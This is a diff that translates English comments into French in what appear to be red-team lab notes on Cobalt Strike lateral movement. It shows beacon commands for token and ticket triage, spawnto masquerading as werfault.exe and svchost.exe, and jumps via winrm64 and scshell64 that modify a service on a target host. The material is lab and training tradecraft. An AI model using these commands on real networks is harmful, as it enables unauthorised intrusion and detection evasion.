@@ -29,8 +29,8 @@ Depuis le Beacon SYSTEM, rechercher les processus exécutés sous l’identité 
 ```cs
 ps
 
-// Look for any process where User = CONTOSO\rsteel
-// e.g. cmd.exe, mmc.exe, explorer.exe owned by rsteel
+// Rechercher les processus dont l’utilisateur est CONTOSO\rsteel
+// Exemples : cmd.exe, mmc.exe ou explorer.exe appartenant à rsteel
 
 krb_triage
 ```
@@ -153,10 +153,10 @@ L’impersonation par token/ticket évite le cracking de hashes dans ce scénari
 ### Préparation — Configurer spawnto avant le Jump
 
 ```cs
-// For WinRM / inject-based jumps (fork & run into remote process)
+// Pour les jumps WinRM ou basés sur l’injection dans un processus distant
 beacon> spawnto x64 %windir%\sysnative\werfault.exe
 
-// For service-based jumps (scshell64, psexec64)
+// Pour les jumps utilisant les services (scshell64, psexec64)
 beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 ```
 
@@ -169,7 +169,7 @@ beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 > Utiliser `winrm64` si WinRM est actif sur la cible.  
 
 ```cs
-beacon> powerpick Test-WSMan lon-ws-1       // test reachability — OPSEC-🟢SAFE, no child proc
+beacon> powerpick Test-WSMan lon-ws-1       // vérifier la connectivité — OPSEC-🟢SAFE, sans processus enfant
 beacon> jump winrm64 lon-ws-1 smb
 ```
 
@@ -200,8 +200,8 @@ Dans ce lab, `scshell64` figure comme une méthode alternative lorsque la métho
 **Utilisé lorsque WinRM est désactivé ou que le payload est bloqué :** modifie un service existant, sans en créer de nouveau.
 
 ```cs
-// Load CNA first if not already loaded:
-// CS → Script Manager → Load → C:\Tools\SCShell\CS-BOF\scshell.cna
+// Charger d’abord le fichier CNA s’il n’est pas déjà chargé :
+// Cobalt Strike → Script Manager → Load → C:\Tools\SCShell\CS-BOF\scshell.cna
 
 beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 beacon> jump scshell64 <target> <listener>
@@ -238,7 +238,7 @@ beacon> rev2self
 - Conclusion de ces observations : le résultat varie selon l’état et le timing de l’environnement ; il ne constitue pas une règle générale.
 
 **Résultats scshell64 :**
-- `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe` required first
+- La configuration `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe` était requise au préalable dans ce lab
 - Le binaire `evil59.exe` a été écrit temporairement dans `\\target\C$\Windows\System32\`, puis supprimé automatiquement.
 - Le chemin du service `defragsvc` a été modifié puis restauré (événement 7040 observé deux fois).
 - Le Beacon a été établi dès la première tentative dans les deux instances observées. Ce résultat reste propre aux tests rapportés.
